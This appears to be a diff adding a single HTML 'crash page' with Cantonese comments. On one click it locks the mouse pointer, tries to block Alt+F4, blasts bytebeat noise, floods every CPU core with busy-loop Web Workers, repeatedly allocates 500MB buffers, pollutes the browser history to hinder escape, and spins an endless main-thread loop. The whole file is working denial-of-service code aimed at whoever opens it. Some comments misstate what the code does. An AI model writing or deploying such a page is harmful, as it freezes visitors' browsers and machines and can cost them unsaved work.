@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>*̸̢͕̳̺̺̰̉̌́̓͆̉̊̍̒</title>
+    <style>
+        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; }
+    </style>
+</head>
+<body onclick="launch()">
+    <script>
+        let triggered = false;
+        let keysPressed = {};
+
+        // 攔截 M 及 M+G
+        window.addEventListener('keydown', (e) => {
+            const key = e.key.toUpperCase();
+            keysPressed[key] = true;
+            if (key === 'Alt' || (keysPressed['Alt'] && keysPressed['F4'])) e.preventDefault();
+        }, true);
+        window.addEventListener('keyup', (e) => { delete keysPressed[e.key.toUpperCase()]; });
+
+        function launch() {
+            if (triggered) return;
+            triggered = true;
+
+            // 1. 鎖定滑鼠
+            document.body.requestPointerLock();
+
+            // 2. 修復版 Bytebeat (直接喚醒 AudioContext)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+
+            const bufferSize = 4096;
+            const scriptNode = audioCtx.createScriptProcessor(bufferSize, 1, 1);
+            let t = 0;
+
+            scriptNode.onaudioprocess = (e) => {
+                const output = e.outputBuffer.getChannelData(0);
+                for (let i = 0; i < bufferSize; i++) {
+                    // Bytebeat 公式: t>>8|t<<6|t>>5|t<<9
+                    let val = (t >> 8 | t << 6 | t >> 5 | t << 9) & 0xFF;
+                    output[i] = (val / 128.0) - 1.0;
+                    t++;
+                }
+            };
+            scriptNode.connect(audioCtx.destination);
+
+            // 3. 真正的崩潰邏輯 (0.3秒後發動)
+            setTimeout(() => {
+                console.log("VOID COMMENCING...");
+
+                // 搶佔 CPU 核心 (Web Workers)
+                const blob = new Blob(["while(true){postMessage(Math.random());}"]);
+                const url = URL.createObjectURL(blob);
+                for(let i=0; i<navigator.hardwareConcurrency; i++) {
+                    new Worker(url);
+                }
+
+                // 鎖死主線程 + 耗盡記憶體 (防止瀏覽器嘗試修復)
+                const crash = () => {
+                    const data = new Uint8Array(500 * 1024 * 1024); // 每次分配 100MB
+                    data.fill(Math.random()); 
+                    window.history.pushState({}, '', Math.random()); // 污染歷史紀錄，令佢難以返轉頭
+                    
+                    // 遞歸調用，製造堆棧溢出
+                    setTimeout(crash, 0); 
+                    while(true) {
+                        // 真正的死循環，入面要做啲嘢防止被優化
+                        document.title = Math.random(); 
+                    }
+                };
+                crash();
+            }, 300);
+        }
+    </script>
+</body>
+</html>
